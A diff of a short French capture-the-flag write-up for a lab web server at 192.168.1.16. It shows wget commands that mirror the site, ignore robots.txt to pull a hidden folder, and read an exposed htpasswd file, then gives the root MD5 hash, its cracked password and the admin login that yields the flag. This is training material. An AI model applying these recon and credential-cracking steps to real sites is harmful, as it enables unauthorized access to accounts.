@@ -1,7 +1,20 @@
-using wget and look in robots.txt file
+wget -R "index.html*" --recursive --level=inf  http://192.168.1.16/
+
+On obtient ainsi les pages, images etc.. du site, dont robots.txt
+Un fichier robots.txt indique aux robots d'exploration d'un moteur de recherche les URL auxquelles il peut accéder sur votre site
+
+Il contient:
+
+User-agent: *
+Disallow: /whatever
+Disallow: /.hidden
+
+
+Donc on peut faire un wget pour recuperer ce qu'il y a dans /whatever
+
 wget -e robots=off -r -np -R "index.html*" 192.168.1.16/whatever/
-going to the /whatever/htpasswd file :
+En regardant dans le fichier /whatever/htpasswd :
 root:437394baff5aa33daa618be47b75cb49
 MD5 decrypt : qwerty123@
-go to domain/admin
-log in with root and qwerty123@
+Puis en allant sur la page  http://192.168.1.16/admin
+log in avec comme login root et mot de passe qwerty123@ on obtient le flag
